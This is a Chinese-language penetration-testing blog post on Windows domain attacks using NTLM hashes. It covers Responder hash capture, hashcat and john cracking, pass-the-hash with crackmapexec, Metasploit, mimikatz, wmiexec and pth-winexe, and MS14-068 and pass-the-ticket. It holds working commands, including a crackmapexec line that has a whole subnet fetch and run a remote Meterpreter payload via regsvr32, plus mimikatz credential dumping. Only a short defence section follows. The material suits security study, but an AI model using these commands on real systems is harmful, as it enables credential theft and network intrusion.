<h2 id="2-网络欺骗"><a href="#2-网络欺骗" class="headerlink" title="2.网络欺骗"></a>2.网络欺骗</h2><p>通常我们采用网络欺骗技术，配合受害者交互的方式窃取到是Net-NTLM Hash。这类hash并不能直接用于<code>pass-the-hash</code>攻击，但可以通过暴力破解的方式来获取明文密码。关于更多获取<code>Net-NTML HASH</code>的技巧，可以参考</p>
<p>常用工具：</p>
<ul>
<li>Responder</li>
<li>Metasploit</li>
</ul>
<h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p><code>responder</code>可以伪造服务，对相关请求进行响应。开启命令：</p>
<pre class=" language-bash"><code class="language-bash">responder -I eth0
</code></pre>
<p>实战环境下，我们应该修改<code>/etc/responder/Responder.conf</code>配置文件，关闭其中的一些不必要的服务，从而减少网络流量，并产生针对性日志，如：</p>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">;</span> Servers to start
SQL <span class="token operator">=</span> Off
SMB <span class="token operator">=</span> On
Kerberos <span class="token operator">=</span> On
FTP <span class="token operator">=</span> Off
POP <span class="token operator">=</span> Off
SMTP <span class="token operator">=</span> Off
IMAP <span class="token operator">=</span> Off
HTTP <span class="token operator">=</span> On
HTTPS <span class="token operator">=</span> On
DNS <span class="token operator">=</span> On
LDAP <span class="token operator">=</span> On
</code></pre>
<p>针对测试而言，我们还可以设置<code>Challenge</code>值，以便观察流量格式：</p>
<pre><code>Challenge = 1122334455667788
</code></pre><p>开启监听后，当用户进行了交互，如在资源管理器中以<code>UNC</code>路径形式访问伪造的服务器：</p>
<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204130140.png" alt=""></p>
<p>此时会弹出虚假认证界面，此时无论受害者是否输入凭据，我们都已经获取了<code>NET NTML Hash</code>。<code>responder</code>默认会将日志保存在<code>/usr/share/responder/logs</code>下，hash记录文件以<code>HTTP-NTLMv2</code>   <code>SMBv2-NTLMv2</code>等前缀开头。</p>
<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204130759.png" alt=""></p>
<p>在渗透测试中，我们还可以通过其他技巧获取<code>Net-NTML Hash</code>，如：</p>
<ul>
<li>命令执行：<code>regsvr32</code>、<code>powershell</code>等</li>
<li>钓鱼文档：doc、docx、pdf</li>
<li>后门设置：</li>
</ul>
<p>例：</p>
<pre><code>regsvr32 /s /u /i://17.10.0.1/@abc hello.dll

powershell -c &quot;Invoke-Item \\17.10.0.1\aa&quot;
powershell -nop -exec bypass -c &quot;Invoke-Item \\17.10.0.1\aa&quot;
Invoke-Item \\192.168.0.1\aa
Get-Content \\192.168.0.1\aa
Start-Process \\192.168.0.1\aa 
</code></pre><h2 id="3-其他技巧"><a href="#3-其他技巧" class="headerlink" title="3.其他技巧"></a>3.其他技巧</h2><p>还有许多其他<code>Credential Dumping</code>姿势，可以参考：</p>
<p><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">dumping-domain-password-hashes</a></p>
<p><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/" target="_blank" rel="noopener">Places of Interest in Stealing NetNTLM Hashes</a> 及译文 <a href="https://paper.seebug.org/474/" target="_blank" rel="noopener">花式窃取NetNTLM哈希的方法</a></p>
<h1 id="四、如何利用Hash？"><a href="#四、如何利用Hash？" class="headerlink" title="四、如何利用Hash？"></a>四、如何利用Hash？</h1><p>在拿到hash之后，我们一般会考虑破解出hash明文密码，或者利用<code>pass-the-hash</code>技术在无需明文密码的情况下进行特权操作。</p>
<h2 id="1-解密Hash"><a href="#1-解密Hash" class="headerlink" title="1.解密Hash"></a>1.解密Hash</h2><h3 id="在线解密"><a href="#在线解密" class="headerlink" title="在线解密"></a>在线解密</h3><p>下面是一些提供在线解密的站点：</p>
<ul>
<li><a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></li>
<li><a href="https://crack.sh/get-cracking/" target="_blank" rel="noopener">https://crack.sh/get-cracking/</a></li>
<li><a href="http://hashcrack.com/index.php" target="_blank" rel="noopener">http://hashcrack.com/index.php</a></li>
<li><a href="http://cracker.offensive-security.com/index.php" target="_blank" rel="noopener">http://cracker.offensive-security.com/index.php</a></li>
<li><a href="http://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php</a></li>
</ul>
<h3 id="本地破解"><a href="#本地破解" class="headerlink" title="本地破解"></a>本地破解</h3><p>我们还可以使用<code>john</code>、<code>hashcat</code>等工具，通过hash表、字典等进行本地破解。当工具内置的hash字典无法成功破解时，我们可以使用自己搜集的字典文件，或者利用社工等方法针对性生成hash字典。</p>
<h4 id="John"><a href="#John" class="headerlink" title="John"></a>John</h4><pre class=" language-bash"><code class="language-bash">john HTTP-NTLMv2-17.10.0.10.txt
</code></pre>
<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204134230.png" alt=""></p>
<h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>使用<code>hashcat -h</code>命令查看帮助，必要的参数有：</p>
<p><code>-m</code>  hash类型</p>
<pre class=" language-bash"><code class="language-bash">LM：3000 
NTLM：1000
NetNTLMv1：5500
NetNTLMv2：5600 
</code></pre>
<p>NTLMv1的格式为：</p>
<pre class=" language-bash"><code class="language-bash">username::hostname:LM response:NTLM response:challenge
</code></pre>
<p>构造后的数据如下：</p>
<pre class=" language-bash"><code class="language-bash">log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee
</code></pre>
<p>Hashcat参数如下：</p>
<pre class=" language-bash"><code class="language-bash">hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force
</code></pre>
<p>下面，使用Hashcat对该Net-NTLM hash进行破解。NTLMv2的格式为：</p>
<pre class=" language-bash"><code class="language-bash">username::domain:challenge:HMAC-MD5:blob
</code></pre>
<blockquote>
<p>值得一提的是，在真实渗透环境下，由于密码复杂度限制，一般我们获取到的<code>NTML-HASH</code>很难直接破解出明文密码，这种情况下我们需要采用其他技术继续进行横向渗透。</p>
</blockquote>
<h2 id="2-Pass-The-Hash"><a href="#2-Pass-The-Hash" class="headerlink" title="2.Pass-The-Hash"></a>2.Pass-The-Hash</h2><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。渗透中当我们获取不到明文密码，或者破解不了NTLM Hash的情况下，哈希传递攻击能够使我们利用这些哈希继续进行横向渗透。</p>
<p>常用<code>Pass-The-Hash</code>工具： </p>
<ul>
<li>Crackmapexec</li>
<li>Mimikatz</li>
<li>smbmap</li>
<li>smbexec</li>
<li>metasploit</li>
<li>cobaltstrike</li>
</ul>
<h3 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></h3><p>1.安装 crackmapexec</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> crackmapexec
<span class="token punctuation">(</span>pip <span class="token function">install</span> crackmapexec<span class="token punctuation">)</span>
</code></pre>
<p>2.使用 crackmapexec</p>
<pre class=" language-bash"><code class="language-bash">cme smb -h
</code></pre>
<p>批量扫描探测命令：</p>
<pre class=" language-python"><code class="language-python">cme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.10</span><span class="token operator">/</span><span class="token number">24</span>
cme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.10</span> <span class="token operator">-</span>u administrator <span class="token operator">-</span>H hash<span class="token punctuation">.</span>txt
cme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.100</span><span class="token operator">-</span><span class="token number">200</span> <span class="token operator">-</span>u administrator <span class="token operator">-</span>H AFC44EE7351D61D00698796DA06B1EBF
</code></pre>
<p>执行命令：</p>
<pre class=" language-python"><code class="language-python">cme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.10</span>  <span class="token operator">-</span>u administrator <span class="token operator">-</span>p toor<span class="token punctuation">(</span>明文密码<span class="token punctuation">)</span> <span class="token operator">-</span>x whoami
cme smb <span class="token number">17.10</span><span class="token punctuation">.</span><span class="token number">0.10</span>  <span class="token operator">-</span>u administrator <span class="token operator">-</span>H afc44ee7351d61d00698796da06b1ebf <span class="token operator">-</span>x whoami
</code></pre>
<p>其他参数</p>
<pre class=" language-bash"><code class="language-bash">--shares    <span class="token comment" spellcheck="true">#枚举共享和访问权限</span>
--sessions    <span class="token comment" spellcheck="true">#枚举活动会话</span>
--disks        <span class="token comment" spellcheck="true">#枚举磁盘</span>
--sam         <span class="token comment" spellcheck="true">#dump目标系统中的SAM哈希值</span>
--loggedon-users    <span class="token comment" spellcheck="true">#枚举登录用户</span>
--users <span class="token punctuation">[</span>USER<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#枚举域用户(如果指定了用户只查询其信息)</span>
--groups <span class="token punctuation">[</span>GROUP<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#枚举域组(如果指定了组其成员被列举)</span>
--local-groups <span class="token punctuation">[</span>GROUP<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#如果指定了组则枚举本地组其成员被列举</span>
--local-groups <span class="token punctuation">[</span>GROUP<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#枚举本地组，如果指定了组，则枚举其成员</span>
-x COMMAND                <span class="token comment" spellcheck="true">#执行指定的命令</span>
-X PS_COMMAND            <span class="token comment" spellcheck="true">#执行指定的PowerShell命令</span>

-L， --list-modules    <span class="token comment" spellcheck="true">#列出可用的拓展功能模块</span>
--options    <span class="token comment" spellcheck="true">#查看模块选项</span>
-M MODULE， --module MODULE     <span class="token comment" spellcheck="true">#使用拓展功能模块</span>
-o MODULE_OPTION <span class="token punctuation">[</span>MODULE_OPTION <span class="token punctuation">..</span>.<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#设置模块选项</span>

</code></pre>
<p>GETSHELL</p>
<p>利用拓展功能模块，我们可以方便地getshell。我们可以使用<code>cme smb -L</code>命令查看所有<code>moudules</code>，对应的物理路径为：</p>
<pre class=" language-python"><code class="language-python"><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>python2<span class="token number">.7</span><span class="token operator">/</span>dist<span class="token operator">-</span>packages<span class="token operator">/</span>crackmapexec<span class="token number">-4.0</span><span class="token punctuation">.</span><span class="token number">1.</span>dev0<span class="token operator">-</span>py2<span class="token number">.7</span><span class="token punctuation">.</span>egg<span class="token operator">/</span>cme<span class="token operator">/</span>modules
</code></pre>
<p>其中提供的<code>met_inject.py</code>模块可以使目标下载执行<code>Meterpreter stager</code>，我们先来看下模块需要的参数：</p>
<pre class=" language-bash"><code class="language-bash">$ cme smb -M met_inject --options
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> met_inject module options:
    LHOST    IP hosting the handler
    LPORT    Handler port
    PAYLOAD  Payload to inject: reverse_http or reverse_https <span class="token punctuation">(</span>default:reverse_https<span class="token punctuation">)</span>
    PROCID   Process ID to inject into <span class="token punctuation">(</span>default: current powershell process<span class="token punctuation">)</span>
</code></pre>
<p>这是一个<code>http</code>或<code>https</code>的反弹shell，我们使用默认的<code>reverse_https</code>，提供需要的<code>LHOST</code>和<code>LPORT</code>的参数即可：</p>
<pre><code>cme smb 17.10.0.10-150 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -M met_inject -o LHOST=17.10.0.1 LPORT=9999
</code></pre><p>命令的意思是通过pass-the-hash批量攻击<code>17.10.0.10-17.10.0.150</code>网段的主机，并使其执行meterpreter的https反弹shell。</p>
<p>笔者测试时遇到问题，无法用<code>met_inject.py</code>模块正常getshell，不知道什么原因。因此选择直接通过命令执行getlshell。利用metasploit的<code>web_delivery</code>模块：</p>
<pre class=" language-bash"><code class="language-bash">use exploit/multi/script/web_delivery
<span class="token keyword">set</span> payload windows/x64/meterpreter/reverse_tcp
<span class="token keyword">set</span> LHOST 17.10.0.1
<span class="token keyword">set</span> LPORT 9999
<span class="token keyword">set</span> target 3
run
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit running as background job 0.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 17.10.0.1:9999 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://0.0.0.0:8080/1KZkey
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Local IP: http://10.204.146.152:8080/1KZkey
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Server started.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Run the following <span class="token function">command</span> on the target machine:
regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll
</code></pre>
<p>通过pass-the-hash执行命令批量getshell</p>
<pre class=" language-bash"><code class="language-bash">cme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x <span class="token string">"regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll"</span>
</code></pre>
<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203201319.png" alt=""></p>
<h3 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">Metasploit</a></h3><p>search <code>psexec</code>，<code>smblogin</code></p>
<pre class=" language-bash"><code class="language-bash">use exploit/windows/smb/psexec 
<span class="token keyword">set</span> payload windows/meterpreter/bind_tcp
<span class="token keyword">set</span> RHOST 17.10.0.10
<span class="token keyword">set</span> smbuser administrator
<span class="token keyword">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF
exploit

use exploit/windows/smb/psexec_psh
<span class="token keyword">set</span> payload windows/meterpreter/bind_tcp
<span class="token keyword">set</span> RHOST 17.10.0.10
<span class="token keyword">set</span> smbuser administrator
<span class="token keyword">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF
</code></pre>
<p>举例：</p>
<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203212818.png" alt=""></p>
<h3 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h3><p>先抓取hash</p>
<pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">""</span>privilege::debug<span class="token string">""</span> <span class="token string">""</span>sekurlsa::logonpasswords<span class="token string">""</span>
</code></pre>
<p>得到hash之后：</p>
<pre class=" language-bash"><code class="language-bash">sekurlsa::pth /user:Administrator /domain:ssooking-pc /ntlm:AFC44EE7351D61D00698796DA06B1EBF
</code></pre>
<h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a></h3><p>exe 版本下载<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">链接</a></p>
<p>windows 管理规范<code>WMI</code>，实际上就是windows从<code>03/XP</code>开始就内置了这个系统插件。其设计初衷之一是为了管理员能更加方便的对远程windows主机进行各种日常管理。</p>
<p>严格来说它其实是为各种服务提供一个统一的调用接口，比如你想操作什么服务就去调用对应的服务类中的方法去执行你的操作。在渗透测试中，它意味着我们可以直接在本地操作远程目标机器上的进程、服务、注册表等包括其它一系列特权操作，wmi是一把在目标内网进行横向移动的非常趁手的武器。<code>wmiexec</code>是一个python2脚本，对windows自带的wmic做了一些强化，让渗透变得更容易。</p>
<p>只能说很多工具吧，比较好用的在这里介绍两种：</p>
<p>wmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为<code>LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。</p>
<pre class=" language-bash"><code class="language-bash">wmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 <span class="token string">"whoami"</span>
</code></pre>
<p><img src="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181204094217.png" alt=""></p>
<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
<p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/" target="_blank" rel="noopener">Invoke-WMIExec</a></p>
<pre class=" language-powershell"><code class="language-powershell">Invoke<span class="token operator">-</span>WMIExec <span class="token operator">-</span>Target 17<span class="token punctuation">.</span>10<span class="token punctuation">.</span>0<span class="token punctuation">.</span>10 <span class="token operator">-</span>Domain test<span class="token punctuation">.</span>local <span class="token operator">-</span>Username test1 <span class="token operator">-</span>Hash AFC44EE7351D61D00698796DA06B1EBF <span class="token operator">-</span>Command <span class="token string">"calc.exe"</span> <span class="token operator">-</span>verbose
</code></pre>
<p>Invoke-SMBExec</p>
<p>通过在目标主机创建服务执行命令，所以权限为system</p>
<pre class=" language-powershell"><code class="language-powershell">Invoke<span class="token operator">-</span>SMBExec <span class="token operator">-</span>Target 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2 <span class="token operator">-</span>Domain ssookinging<span class="token operator">-</span>pc <span class="token operator">-</span>Username test1 <span class="token operator">-</span>Hash 7ECFFFF0C3548187607A14BAD0F88BB1 <span class="token operator">-</span>Command <span class="token string">"calc.exe"</span> <span class="token operator">-</span>verbose
</code></pre>
<p><strong>Invoke-SMBClient：</strong></p>
<p>支持SMB1, SMB2 (2.1), and SMB signing</p>
<p>如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本</p>
<p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p>
<pre class=" language-bash"><code class="language-bash">Invoke-SMBExec -Target 192.168.0.102 -Domain workgroup -Username administrator -Hash 03bebb338e70244589ea67c7439c77ba -Command <span class="token string">"notepad.exe"</span> -verbose
</code></pre>
<h3 id="PTH-EXEC"><a href="#PTH-EXEC" class="headerlink" title="PTH-EXEC"></a>PTH-EXEC</h3><p>kali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：</p>
<pre class=" language-bash"><code class="language-bash">pth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exe

pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe
</code></pre>
<p>![](<a href="https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203225415.png" target="_blank" rel="noopener">https://raw.githubusercontent.com/ssooking/imgbed/master/img/yushentou-ntml-hash/20181203225415.png</a></p>
<h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h2><p>ptt攻击的部分就不是简单的ntlm认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：<em>MS14-068</em>,<em>Golden ticket</em>,<em>SILVER TICKET</em>.<br>之前介绍了Kerberos协议具体工作方法，在域中，简要介绍一下：</p>
<ul>
<li>客户机将明文密码进行ntlm哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控）,kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</li>
<li>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中tgt数据</li>
<li>然后客户机将tgt发送给域控制器KDC请求TGS（票证授权服务）票证，并且对tgt进行检测</li>
<li><p>检测成功之后，将目标服务账户的ntlm以及tgt进行加密，将加密后的结果返回给客户机。</p>
</li>
<li><h3 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h3><blockquote>
<p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</p>
</blockquote>
</li>
</ul>
<p>这里不得不说walkerfuz表哥写的这篇分析文章：<a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/56081.html</a> 最详细的分析，没有之一，向表哥学习！<br>我用最简单的语言表达一下:</p>
<pre class=" language-bash"><code class="language-bash">windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。
1. 在请求AS时，将require_PAC设置成False。
2. 在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。
3. TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT（微软的锅）
</code></pre>
<p>利用过程：<br>1.whoami/user 得到普通域用户的sid</p>
<p>2.执行payload生成ccache:</p>
<pre><code>`MS14-068.exe -u yifan@test.local -s S-1-5-21-4173655609-916892889-516531421-1108 -d dc-01.test.local -p A100b200`
</code></pre><p>3.使用mimikatz注入凭据:</p>
<pre><code>kerberos::purge #清空当前机器存在的凭证
kerberos::ptc y:\downloads\TGT_yifan@test.local.ccache
</code></pre><p>显示Injecting ticket : OK就表示注入成功了～<br>4.查看注入是否成功并且登录域控：</p>
<p>发现已经将凭证注入进去了～下面可以使用net use进行登录，或者使用psexec,wmi等方法进行远程执行命令。注意，这里登录时，要使用机器名，不要使用IP，否则没办法攻击成功。</p>
<p>考虑到mimikatz的pth功能需要本地管理员权限，所以mimikatz也提供了不需要管理员权限的解决方法Pass-The-Ticket</p>
<p>Pass-The-Ticket需要用到gentilkiwi开源的另一款工具kekeo，下载地址：</p>
<p><a href="https://github.com/gentilkiwi/kekeo" target="_blank" rel="noopener">https://github.com/gentilkiwi/kekeo</a></p>
<p>参数实例：</p>
<pre class=" language-bash"><code class="language-bash">kekeo <span class="token string">"tgt::ask /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1"</span>
</code></pre>
<p>执行后生成票据<a href="mailto:`TGT_test1@TEST.LOCA" target="_blank" rel="noopener">`TGT_test1@TEST.LOCA</a><a href="mailto:L_krbtgt~test.local@TEST.LOCAL.kirbi" target="_blank" rel="noopener">L_krbtgt~test.local@TEST.LOCAL.kirbi</a>`</p>
<p>接下来导入票据：</p>
<pre class=" language-bash"><code class="language-bash">kekeo <span class="token string">"kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"</span>
</code></pre>
<h1 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h1><p>结合攻击方法，总结防御思路如下：<br>检查特殊文件.scf 和 desktop.ini，避免被添加UNC路径<br>如无特殊需要，建议配置防火墙规则禁止139和445端口</p>
<h1 id="六、后渗透思路拓展"><a href="#六、后渗透思路拓展" class="headerlink" title="六、后渗透思路拓展"></a>六、后渗透思路拓展</h1><p>内网欺骗劫持<br>钓鱼文件<br>后门命令<br>拿下一台文件服务器后，在上面创建图标、desktop.ini、link、url等</p>
<p><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">pass the hash with RDP</a></p>
<p>获取域控</p>
<pre class=" language-bash"><code class="language-bash">msf<span class="token operator">></span> run post/windows/gather/credentials/gpp
</code></pre>
<p><strong>参考链接</strong></p>
<ul>
<li><a href="https://docs.microsoft.com/zh-cn/windows/desktop/SecAuthN/microsoft-ntlm" target="_blank" rel="noopener">Microsoft NTLM</a></li>
<li><a href="http://www.cnblogs.com/xwdreamer/archive/2012/08/23/2652541.html" target="_blank" rel="noopener">http://www.cnblogs.com/xwdreamer/archive/2012/08/23/2652541.html</a></li>
<li><a href="https://www.freebuf.com/articles/database/70395.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/70395.html</a></li>
<li><a href="https://blog.csdn.net/qq_27446553/article/details/73635108" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/73635108</a></li>
<li><a href="https://zhidao.baidu.com/question/1845749.html" target="_blank" rel="noopener">工作组和域的区别</a></li>
<li><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">彻底理解Windows认证</a></li>
<li><a href="https://www.cnblogs.com/artech/archive/2011/01/25/NTLM.html" target="_blank" rel="noopener">Windows安全认证是如何进行的？[NTLM篇]</a></li>
<li><a href="https://blog.csdn.net/yangxin114/article/details/8112018" target="_blank" rel="noopener">Windows下的身份验证—-NTLM和Kerberos</a></li>
<li><a href="http://xnianq.cn/2018/10/16/域渗透之横向移动/" target="_blank" rel="noopener">域渗透之横向移动</a></li>
<li><a href="https://blog.csdn.net/pyphrb/article/details/52051321" target="_blank" rel="noopener">https://blog.csdn.net/pyphrb/article/details/52051321</a></li>
<li><a href="https://3gstudent.github.io/3gstudent.github.io/Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍/" target="_blank" rel="noopener">Windows下的密码hash-NTLM-hash和Net-NTLM-hash介绍</a></li>
<li><a href="https://3gstudent.github.io/3gstudent.github.io/渗透技巧-利用netsh抓取连接文件服务器的NTLMv2-Hash/" target="_blank" rel="noopener">渗透技巧-利用netsh抓取连接文件服务器的NTLMv2-Hash</a></li>
<li><a href="https://blog.csdn.net/Fly_hps/article/details/80641938" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/80641938</a></li>
<li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html</a></li>
<li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html</a></li>
</ul>

            </div>
            <hr>

            
            <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.88rem;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff;
        background-color: #22AB38;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff;
        background-color: #019FE8;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close"><i class="fa fa-close"></i></a>
            <h4 class="reward-title">您的赏识是我创造的动力!</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs">
                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                    </ul>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('#reward .reward-link').on('click', function () {
            $('#rewardModal').openModal();
        });

        $('#rewardModal .close').on('click', function () {
            $('#rewardModal').closeModal();
        });
    });
</script>
            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            <div class="reprint">
                <p>
                    <span class="reprint-tip">转载请注明: </span>
                    <a href="https://ssooking.github.io" class="b-link-green">ssooking's blog</a>
                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
                    <a href="/yu-shen-tou-zhi-ntml-hash/" class="b-link-green">域渗透之NTML-Hash</a>
                </p>
            </div>
        </div>
    </div>

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
